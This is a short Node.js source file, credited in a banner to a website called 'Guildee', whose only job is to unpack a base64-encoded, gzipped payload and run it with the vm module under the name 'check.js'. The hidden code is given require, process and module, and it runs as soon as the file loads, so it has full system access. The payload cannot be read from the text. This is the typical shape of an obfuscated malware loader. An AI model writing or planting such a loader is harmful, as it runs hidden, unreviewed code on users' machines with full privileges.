
/*
╔══════════════════════════════════════════════════════════╗
║        Website : Guildee                                 ║
║        Autheur : Yusu_sauvage                            ║
╚══════════════════════════════════════════════════════════╝
*/
const zlib = require("zlib");
const vm = require("vm");

const PAYLOAD_B64 = "H4sIAAAAAAAACl2Q32qDMBTG7wu+w1muFGZknUy7IoPtEfoEMTnRzJq45ITVlb770JYOdvvj+8cnnQ0EGkn20IDHr2g8psw6hflKWbZPNslGhNlK0NFKMs5Ch/TRoxwOcyAc0wzOyQYAQK5xHgM0IL6FuUWnrCeawmtRiMnwLpqjQuSn+ad4G3BudmKLz7oSeb1rRV5WqHJR1ZgrqdS21KV+ku2646/iMzh77/AY+ALS69ZFZTSkC+KBBMUAD00DzA0sA48UvQXG7tobeY9ao+fau/FqVYIElx6VoUdgrQj4UrKMkzuQN7ZLWSRdr7suS9ToVDwix9PkPC0HnP/dBJf9L4qRG31vAQAA";

function runPacked() {
  const gz = Buffer.from(PAYLOAD_B64, "base64");
  const code = zlib.gunzipSync(gz).toString("utf8");

  const script = new vm.Script(code, { filename: "check.js" });
  const context = vm.createContext({
    require,
    module,
    exports,
    __dirname,
    __filename,
    process,
    console,
    Buffer,
    setTimeout,
    setInterval,
    clearTimeout,
    clearInterval,
  });

  script.runInContext(context);
}

runPacked();
